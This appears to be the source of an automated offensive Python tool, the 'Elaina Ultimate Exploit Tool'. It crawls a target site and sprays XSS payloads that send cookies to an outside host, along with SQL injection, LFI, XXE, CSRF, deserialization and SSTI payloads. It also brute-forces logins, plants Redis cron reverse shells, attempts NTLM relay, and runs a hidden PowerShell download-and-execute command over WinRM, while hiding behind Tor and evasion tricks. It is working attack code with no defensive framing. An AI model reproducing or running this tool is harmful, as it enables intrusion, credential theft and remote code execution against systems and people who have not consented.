import os
import sys
import time
import json
import random
import warnings
import argparse
import urllib.parse
import socket
import ipaddress
import subprocess
import requests
import cloudscraper
from bs4 import BeautifulSoup
from colorama import init
import undetected_chromedriver as uc
from seleniumwire import webdriver as wire_webdriver
from selenium.webdriver.common.by import By
from stem.control import Controller
from impacket.examples.ntlmrelayx import ntlmrelayx
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetOptions
from impacket import ntlm
from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthenticate
from impacket.dcerpc.v5 import transport, epm
from impacket.dcerpc.v5.rpcrt import DCERPCException
from base64 import b64encode
import hashlib
import re
import threading
import queue
from datetime import datetime
import pickle
import yaml
import string
from functools import wraps
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

init(autoreset=True)
warnings.filterwarnings("ignore")

LOG_JSON_PATH = "elaina_ultimate_log.json"
COOKIE_PATH = "elaina_ultimate_cookies.txt"
STATE_PATH = "elaina_state.pkl"
CONFIG_PATH = "elaina_config.yaml"
PAYLOAD_DB_PATH = "payloads.db"

attacker_ip = os.environ.get("ATTACKER_IP", "127.0.0.1")
log_entries = []
attack_state = {}

def load_config():
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH) as f:
            return yaml.safe_load(f)
    return {
        "delay_range": [1, 5],
        "retry_count": 3,
        "timeout": 10,
        "user_agents": [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ],
        "stealth_mode": True,
        "randomize_headers": True,
        "max_threads": 5
    }

config = load_config()

def save_state():
    with open(STATE_PATH, "wb") as f:
        pickle.dump(attack_state, f)

def load_state():
    global attack_state
    if os.path.exists(STATE_PATH):
        with open(STATE_PATH, "rb") as f:
            attack_state = pickle.load(f)

def log(action, target, status, detail=None):
    entry = {
        "action": action,
        "target": target,
        "status": status,
        "detail": detail or "",
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    log_entries.append(entry)
    attack_state["last_action"] = entry
    save_state()
    with open(LOG_JSON_PATH, "w") as f:
        json.dump(log_entries, f, indent=2)

def retry_on_failure(retry_count=config["retry_count"]):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            for i in range(retry_count):
                try:
                    return f(*args, **kwargs)
                except Exception as e:
                    if i == retry_count - 1:
                        raise
                    time.sleep(random.uniform(1, 3))
        return wrapper
    return decorator

def random_delay():
    if config["stealth_mode"]:
        time.sleep(random.uniform(*config["delay_range"]))

def obfuscate_payload(payload):
    if config["stealth_mode"]:
        methods = [
            lambda p: b64encode(p.encode()).decode(),
            lambda p: "".join(f"&#{ord(c)};" for c in p),
            lambda p: p.replace(" ", "/**/").replace("=", " LIKE ").replace("<", "<!").replace(">", ">!"),
            lambda p: "".join(f"%{ord(c):02x}" for c in p.encode()),
            lambda p: hashlib.md5(p.encode()).hexdigest() if len(p) < 32 else p
        ]
        return random.choice(methods)(payload)
    return payload

def renew_tor_ip(password="yuriontop"):
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password=password)
            controller.signal("NEWNYM")
            log("tor", "localhost", "success")
            random_delay()
    except Exception as e:
        log("tor", "localhost", "failed", str(e))

def load_proxy_config():
    if os.path.exists("proxy.json"):
        with open("proxy.json") as f:
            return json.load(f)
    return {}

def setup_scraper(proxy_cfg=None):
    session = cloudscraper.create_scraper(
        browser={"custom": "ScraperBot-Yuri08"},
        delay=10,
        interpreter="nodejs"
    )
    
    ua = random.choice(config["user_agents"])
    session.headers.update({
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    })
    
    if config["randomize_headers"]:
        session.headers.update({
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        })
    
    retry_strategy = Retry(
        total=config["retry_count"],
        backoff_factor=1,
        status_forcelist=[401, 403, 429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if proxy_cfg:
        session.proxies.update(proxy_cfg)
    
    return session

def setup_browser(proxy_cfg=None):
    options = uc.ChromeOptions()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-plugins")
    options.add_argument("--disable-images")
    options.add_argument("--disable-javascript")
    options.add_argument("--disable-web-security")
    options.add_argument("--disable-features=VizDisplayCompositor")
    
    wire_opts = {'verify_ssl': False}
    if proxy_cfg and ("http" in proxy_cfg or "https" in proxy_cfg):
        proxy_url = proxy_cfg.get("http") or proxy_cfg.get("https")
        wire_opts['proxy'] = {
            'http': proxy_url,
            'https': proxy_url,
            'no_proxy': 'localhost,127.0.0.1'
        }
        options.add_argument(f"--proxy-server={proxy_url}")
    
    driver = wire_webdriver.Chrome(options=options, seleniumwire_options=wire_opts)
    return driver

def dump_browser_storage(driver, url):
    driver.get(url)
    time.sleep(4)
    local_storage = driver.execute_script("return {...localStorage};")
    session_storage = driver.execute_script("return {...sessionStorage};")
    cookies = driver.get_cookies()
    log("storage_dump", url, "success", {
        "localStorage_keys": list(local_storage.keys()),
        "sessionStorage_keys": list(session_storage.keys()),
        "cookies_count": len(cookies)
    })
    with open(COOKIE_PATH, "a") as f:
        for c in cookies:
            f.write(f"{url} => {c}\n")
    return {"localStorage": local_storage, "sessionStorage": session_storage, "cookies": cookies}

def extract_js_endpoints(driver):
    scripts = driver.find_elements(By.TAG_NAME, "script")
    js_urls = [s.get_attribute("src") for s in scripts if s.get_attribute("src")]
    network_js = [req.url for req in driver.requests if req.response and ("javascript" in req.response.headers.get("Content-Type", "").lower() or req.path.endswith(".js"))]
    js_all = list(set(js_urls + network_js))
    log("js_endpoints", driver.current_url, "success", {"count": len(js_all)})
    return js_all

def dump_websocket_endpoints(driver):
    ws_endpoints = [req.url for req in driver.requests if req.url.startswith(("ws://", "wss://"))]
    log("websocket_endpoints", driver.current_url, "success", {"count": len(ws_endpoints)})
    return list(set(ws_endpoints))

def send_to_burp(req):
    burp_api = "http://127.0.0.1:1337/v1/repeater"
    try:
        headers = {k: v for k, v in req.headers.items()}
        payload = {
            "request": {
                "method": req.method,
                "url": req.url,
                "headers": headers,
                "body": req.body.decode() if req.body else "",
            }
        }
        r = requests.post(burp_api, json=payload)
        log("burp_repeater", req.url, "success" if r.status_code == 200 else "failed", f"Status {r.status_code}")
    except Exception as e:
        log("burp_repeater", req.url, "error", str(e))

def load_payloads():
    if os.path.exists(PAYLOAD_DB_PATH):
        with open(PAYLOAD_DB_PATH, "r") as f:
            return json.load(f)
    
    payloads = {
        "xss": [
            "<script>fetch('https://evil.site/log?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('https://evil.site/log?c='+document.cookie)>",
            "<svg onload=fetch('https://evil.site/log?c='+document.cookie)>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<iframe src=javascript:fetch('https://evil.site/log?c='+document.cookie)>",
            "<body onload=fetch('https://evil.site/log?c='+document.cookie)>",
            "<input onfocus=fetch('https://evil.site/log?c='+document.cookie) autofocus>",
            "<select onfocus=fetch('https://evil.site/log?c='+document.cookie) autofocus>",
            "<textarea onfocus=fetch('https://evil.site/log?c='+document.cookie) autofocus>",
            "<keygen onfocus=fetch('https://evil.site/log?c='+document.cookie) autofocus>"
        ],
        "sql_injection": [
            "' OR '1'='1' -- ",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR 1=1#",
            "' UNION SELECT 1,2,3--",
            "' AND SLEEP(5)--",
            "' OR 1=1/*",
            "' AND 1=1--"
        ],
        "lfi": [
            "../../../../../../etc/passwd",
            "../../../../../../windows/win.ini",
            "../../../../../../proc/self/environ",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "/var/log/apache2/access.log",
            "/proc/self/cmdline",
            "/etc/hosts"
        ],
        "xxe": [
            """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.site/evil.dtd">%remote;]><root></root>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SSBsb3ZlIFhNTCE=">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.site/evil.dtd">%xxe;]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://evil.site/file">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://evil.site:70/_">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.site/%252e%252e%252fetc%252fpasswd">]><foo>&xxe;</foo>"""
        ],
        "csrf": [
            """<img src="https://evil.site/csrf?token=document.cookie">""",
            """<body onload="document.forms[0].submit()"><form method="POST" action="https://target.com/change-password"><input type="hidden" name="newpassword" value="hacked"></form></body>""",
            """<script>fetch('https://target.com/api/delete', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({id: '1'})})</script>""",
            """<iframe src="https://target.com/admin/delete-user?id=1"></iframe>""",
            """<form action="https://target.com/transfer" method="POST"><input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="1000"></form><script>document.forms[0].submit()</script>""",
            """<svg onload="fetch('https://target.com/logout', {method: 'POST'})">""",
            """<link rel="stylesheet" href="https://target.com/admin/delete-user?id=1">""",
            """<meta http-equiv="refresh" content="0; url=https://target.com/logout">""",
            """<body onload="var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://target.com/delete-account', true); xhr.send();">""",
            """<script>var x = new XMLHttpRequest(); x.open('POST', 'https://target.com/admin/add-user', true); x.setRequestHeader('Content-Type', 'application/json'); x.send(JSON.stringify({username: 'hacked', password: 'hacked', admin: true}));</script>"""
        ],
        "deserialization": [
            """O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"test";}""",
            """O:8:"stdClass":1:{s:1:"a";O:8:"stdClass":1:{s:1:"a";s:7:"system()";}}""",
            """O:4:"Test":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";s:7:"system()";}""",
            """O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}""",
            """O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"test";s:5:"admin";b:1;}""",
            """O:4:"Test":2:{s:1:"a";O:8:"stdClass":1:{s:1:"a";s:7:"system()";};s:1:"b";s:7:"phpinfo();";}""",
            """O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:5:"admin";b:1;}""",
            """O:4:"Test":2:{s:1:"a";s:10:"phpinfo();";s:1:"b";O:8:"stdClass":1:{s:1:"a";s:7:"system()";}}""",
            """O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"test";s:8:"callback";s:7:"system()";}""",
            """O:4:"Test":2:{s:1:"a";s:7:"system()";s:1:"b";s:10:"phpinfo();";}"""
        ],
        "ssti": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{''.class.mro[1].subclasses()}}",
            "${''.class.mro[1].subclasses()}",
            "#{''.class.mro[1].subclasses()}",
            "{{config.items()}}",
            "${config.items()}",
            "#{config.items()}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
        ],
        "redis_rce": [
            "flushall\r\nset 1 '\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\\n\\n'\r\nconfig set dir /var/spool/cron/\r\nconfig set dbfilename root\r\nsave\r\n",
            "eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0",
            "module load /path/to/exp.so\r\nsystem.exec id\r\n",
            "set x \"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\\n\\n\"\r\nconfig set dir /var/spool/cron/crontabs/\r\nconfig set dbfilename root\r\nsave\r\n",
            "set payload \"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\\n\\n\"\r\nconfig set dir /etc/cron.d/\r\nconfig set dbfilename payload\r\nsave\r\n",
            "eval 'dofile(\"/etc/passwd\")' 0",
            "eval 'os.execute(\"id\")' 0",
            "eval 'local f=io.popen(\"id\",\"r\");local res=f:read(\"*a\");f:close();return res' 0",
            "eval 'local socket=require(\"socket\");local client=socket.connect(\"ATTACKER_IP\",443);client:send(os.execute(\"id\"));client:close()' 0",
            "set 1 \"\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\\n\\n\"\r\nconfig set dir /var/spool/cron/crontabs/\r\nconfig set dbfilename root\r\nsave\r\n"
        ]
    }
    
    with open(PAYLOAD_DB_PATH, "w") as f:
        json.dump(payloads, f)
    
    return payloads

payloads = load_payloads()

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def spider(url, session, depth=3, seen=None):
    if seen is None:
        seen = set()
    if url in seen or depth == 0:
        return
    seen.add(url)
    
    try:
        res = session.get(url, timeout=config["timeout"], verify=False)
        soup = BeautifulSoup(res.text, "html.parser")
        log("crawl", url, "ok")
    except Exception as e:
        log("crawl", url, "failed", str(e))
        return
    
    for form in soup.find_all("form"):
        attack_form(form, url, session)
    
    for a in soup.find_all("a", href=True):
        link = urllib.parse.urljoin(url, a.get("href"))
        if link.startswith("http") and link not in seen:
            try:
                payload = random.choice(payloads["xss"])
                session.post(link, data={random_string(): obfuscate_payload(payload)}, verify=False)
                log("payload_drop", link, "sent")
                random_delay()
            except Exception as e:
                log("payload_drop", link, "error", str(e))
            spider(link, session, depth-1, seen)

@retry_on_failure()
def attack_form(form, base_url, session):
    target = urllib.parse.urljoin(base_url, form.get("action", ""))
    fields = [i.get("name") for i in form.find_all("input") if i.get("name")]
    user = next((f for f in fields if "user" in f.lower() or "email" in f.lower()), None)
    pwd = next((f for f in fields if "pass" in f.lower()), None)
    
    if not user or not pwd:
        try:
            payload = random.choice(payloads["xss"])
            session.post(target, data={random_string(): obfuscate_payload(payload)}, verify=False)
            log("form_inject", target, "no_auth_fields", {"payload": "xss"})
        except Exception as e:
            log("form_inject", target, "error", str(e))
        return
    
    creds = [("admin", "admin"), ("root", "toor"), ("test", "1234"), ("administrator", "password"), ("admin", "password")]
    for u, p in creds:
        try:
            res = session.post(target, data={user: u, pwd: p}, timeout=config["timeout"], verify=False)
            if "invalid" not in res.text.lower() and "error" not in res.text.lower():
                log("form_brute", target, "success", {"user": u, "pass": p})
                payload = random.choice(payloads["xss"])
                session.post(target, data={user: obfuscate_payload(payload), pwd: obfuscate_payload(payload)}, verify=False)
                return
        except Exception as e:
            log("form_error", target, "exception", str(e))
    
    log("form_brute", target, "failed")

@retry_on_failure()
def attempt_sql_injection(url, session):
    for payload in payloads["sql_injection"][:10]:
        try:
            params = {"id": obfuscate_payload(payload)}
            r = session.get(url, params=params, timeout=config["timeout"], verify=False)
            if "sql syntax" not in r.text.lower() and r.status_code == 200:
                log("sql_injection", url, "success", {"payload": payload})
                return True
        except Exception:
            continue
    log("sql_injection", url, "failed")
    return False

@retry_on_failure()
def attempt_ssrf(url, session, ldap_ip):
    payload = f"gopher://{ldap_ip}:389/_03000102063a8001020101630b04070006082b864886f7120102020500"
    ssrf_points = [
        f"{url}/api/redirect?url={payload}",
        f"{url}/redirect?url={payload}",
        f"{url}/proxy?url={payload}",
        f"{url}/fetch?url={payload}"
    ]
    
    for target in ssrf_points:
        try:
            r = session.get(target, timeout=config["timeout"], verify=False)
            if r.status_code == 200:
                log("ssrf", target, "success", {"payload": payload})
                return True
        except Exception:
            continue
    log("ssrf", url, "failed")
    return False

@retry_on_failure()
def attempt_lfi(url, session):
    for payload in payloads["lfi"][:10]:
        try:
            target = f"{url}?file={obfuscate_payload(payload)}"
            r = session.get(target, timeout=config["timeout"], verify=False)
            if "root:x:" in r.text or "[extensions]" in r.text or "daemon:" in r.text:
                log("lfi", target, "success")
                return True
        except Exception:
            continue
    log("lfi", url, "failed")
    return False

@retry_on_failure()
def attempt_xxe(url, session):
    headers = {"Content-Type": "application/xml"}
    for payload in payloads["xxe"][:10]:
        try:
            r = session.post(url, data=obfuscate_payload(payload), headers=headers, timeout=config["timeout"], verify=False)
            if "root:x:" in r.text or "win.ini" in r.text or "base64" in r.text:
                log("xxe", url, "success")
                return True
        except Exception:
            continue
    log("xxe", url, "failed")
    return False

@retry_on_failure()
def attempt_idor(url, session):
    test_urls = [f"{url}/user/1", f"{url}/user/2", f"{url}/api/user/1", f"{url}/api/user/2"]
    for turl in test_urls:
        try:
            r = session.get(turl, timeout=config["timeout"], verify=False)
            if r.status_code == 200 and ("user" in r.text.lower() or "profile" in r.text.lower()):
                log("idor", turl, "success")
                return True
        except Exception:
            continue
    log("idor", url, "failed")
    return False

@retry_on_failure()
def attempt_csrf(url, session):
    for payload in payloads["csrf"][:10]:
        try:
            headers = {"Content-Type": "text/html"}
            r = session.post(url, data=obfuscate_payload(payload), headers=headers, timeout=config["timeout"], verify=False)
            if r.status_code == 200:
                log("csrf", url, "success")
                return True
        except Exception:
            continue
    log("csrf", url, "failed")
    return False

@retry_on_failure()
def attempt_deserialization(url, session):
    for payload in payloads["deserialization"][:10]:
        try:
            headers = {"Content-Type": "application/octet-stream"}
            r = session.post(url, data=obfuscate_payload(payload), headers=headers, timeout=config["timeout"], verify=False)
            if r.status_code == 200:
                log("deserialization", url, "success")
                return True
        except Exception:
            continue
    log("deserialization", url, "failed")
    return False

@retry_on_failure()
def attempt_ssti(url, session):
    for payload in payloads["ssti"][:10]:
        try:
            params = {"input": obfuscate_payload(payload)}
            r = session.get(url, params=params, timeout=config["timeout"], verify=False)
            if "49" in r.text or "7777777" in r.text or "subclasses" in r.text:
                log("ssti", url, "success")
                return True
        except Exception:
            continue
    log("ssti", url, "failed")
    return False

@retry_on_failure()
def attempt_redis_rce(ip):
    for payload in payloads["redis_rce"][:10]:
        try:
            payload = payload.replace("ATTACKER_IP", attacker_ip)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, 6379))
            s.send(payload.encode())
            s.close()
            log("redis_rce", ip, "success")
            return True
        except Exception as e:
            log("redis_rce", ip, "failed", str(e))
            continue
    log("redis_rce", ip, "failed")
    return False

def scan_ldap_ips(cidr):
    net = ipaddress.ip_network(cidr, strict=False)
    ips = [str(ip) for ip in net.hosts()]
    found = []
    
    def scan_ip(ip):
        for port in [389, 636]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.close()
                found.append(ip)
                break
            except:
                continue
    
    threads = []
    for ip in ips:
        t = threading.Thread(target=scan_ip, args=(ip,))
        threads.append(t)
        t.start()
        if len(threads) >= config["max_threads"]:
            for t in threads:
                t.join()
            threads = []
    
    for t in threads:
        t.join()
    
    return found

@retry_on_failure()
def relay_ntlm_attack(ldap_ip):
    stringbinding = r'ncacn_http:{}[5985]'.format(ldap_ip)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_connect_timeout(5)
    try:
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(epm.MSRPC_UUID_PORTMAP)
        log("ntlm_relay", ldap_ip, "connected")
        dce.disconnect()
        return True
    except DCERPCException as e:
        log("ntlm_relay", ldap_ip, "failed", str(e))
        return False
    except Exception as e:
        log("ntlm_relay", ldap_ip, "failed", str(e))
        return False

def run_powershell_via_winrm(target_ip, username, password, command):
    try:
        import winrm
    except ImportError:
        log("winrm", target_ip, "failed", "winrm package not installed")
        return False
    try:
        session = winrm.Session(target_ip, auth=(username, password))
        r = session.run_ps(command)
        output = r.std_out.decode(errors='ignore') if r.std_out else ''
        error = r.std_err.decode(errors='ignore') if r.std_err else ''
        log("winrm_powershell", target_ip, "success", {"output": output, "error": error})
        return True
    except Exception as e:
        log("winrm_powershell", target_ip, "failed", str(e))
        return False

def chain_exploit_ssrf_to_adcs(session, target_url, ldap_ip, winrm_user=None, winrm_pass=None):
    payload = f"gopher://{ldap_ip}:389/_03000102063a8001020101630b04070006082b864886f7120102020500"
    ssrf_points = [
        f"{target_url}/api/redirect?url={payload}",
        f"{target_url}/redirect?url={payload}",
        f"{target_url}/proxy?url={payload}",
        f"{target_url}/fetch?url={payload}"
    ]
    
    for url in ssrf_points:
        try:
            r = session.get(url, timeout=config["timeout"], verify=False)
            if r.status_code == 200:
                log("chain_ssrf", url, "success")
                if relay_ntlm_attack(ldap_ip):
                    log("chain_relay_ntlm", ldap_ip, "success")
                    if winrm_user and winrm_pass:
                        ps_cmd = f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{attacker_ip}/payload.ps1')\""
                        run_powershell_via_winrm(ldap_ip, winrm_user, winrm_pass, ps_cmd)
                    return True
        except Exception as e:
            log("chain_exploit", url, "failed", str(e))
    return False

def auto_exploit_vulnerabilities(session, url, ldap_ip, winrm_user=None, winrm_pass=None):
    vulnerabilities = [
        (attempt_sql_injection, [url, session]),
        (attempt_ssrf, [url, session, ldap_ip]),
        (attempt_lfi, [url, session]),
        (attempt_xxe, [url, session]),
        (attempt_idor, [url, session]),
        (attempt_csrf, [url, session]),
        (attempt_deserialization, [url, session]),
        (attempt_ssti, [url, session]),
        (attempt_redis_rce, [ldap_ip]),
        (lambda *args: chain_exploit_ssrf_to_adcs(session, url, ldap_ip, winrm_user, winrm_pass), [])
    ]
    
    for vuln_func, args in vulnerabilities:
        try:
            result = vuln_func(*args)
            if result:
                log("auto_exploit", url, "success", {"vulnerability": vuln_func.__name__})
                random_delay()
        except Exception as e:
            log("auto_exploit", url, "failed", {"vulnerability": vuln_func.__name__, "error": str(e)})

def execute(target, ldap_subnet=None, use_tor=False, tor_pass="yuriontop", use_burp=False, winrm_user=None, winrm_pass=None):
    open(LOG_JSON_PATH, "w").write("[]")
    open(COOKIE_PATH, "w").write("")
    load_state()
    
    if use_tor:
        renew_tor_ip(tor_pass)
    
    proxy_cfg = load_proxy_config()
    session = setup_scraper(proxy_cfg)
    
    ldap_ip = None
    if ldap_subnet:
        ldap_candidates = scan_ldap_ips(ldap_subnet)
        if ldap_candidates:
            ldap_ip = ldap_candidates[0]
        else:
            ldap_ip = "10.0.0.5"
    else:
        ldap_ip = "10.0.0.5"
    
    spider(target, session)
    auto_exploit_vulnerabilities(session, target, ldap_ip, winrm_user, winrm_pass)
    
    driver = setup_browser(proxy_cfg)
    try:
        storage = dump_browser_storage(driver, target)
        js_endpoints = extract_js_endpoints(driver)
        ws_endpoints = dump_websocket_endpoints(driver)
        
        if use_burp:
            for req in driver.requests:
                send_to_burp(req)
        
        full_log = {
            "url": target,
            "storage": storage,
            "js_endpoints": js_endpoints,
            "websocket_endpoints": ws_endpoints,
            "chain_exploit": True
        }
        
        with open(LOG_JSON_PATH, "a") as f:
            f.write(json.dumps(full_log, indent=2))
    finally:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description="Elaina Ultimate Exploit Tool")
    parser.add_argument("url", help="Target URL to scan & attack")
    parser.add_argument("--tor", action="store_true", help="Enable TOR")
    parser.add_argument("--tor-pass", default="yuriontop", help="TOR control password")
    parser.add_argument("--burp", action="store_true", help="Send requests to Burp Repeater API")
    parser.add_argument("--ldap-subnet", help="CIDR subnet for LDAP scan, e.g. 10.0.0.0/24")
    parser.add_argument("--winrm-user", help="Username for WinRM PowerShell execution")
    parser.add_argument("--winrm-pass", help="Password for WinRM PowerShell execution")
    args = parser.parse_args()
    
    try:
        execute(
            args.url,
            ldap_subnet=args.ldap_subnet,
            use_tor=args.tor,
            tor_pass=args.tor_pass,
            use_burp=args.burp,
            winrm_user=args.winrm_user,
            winrm_pass=args.winrm_pass,
        )
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
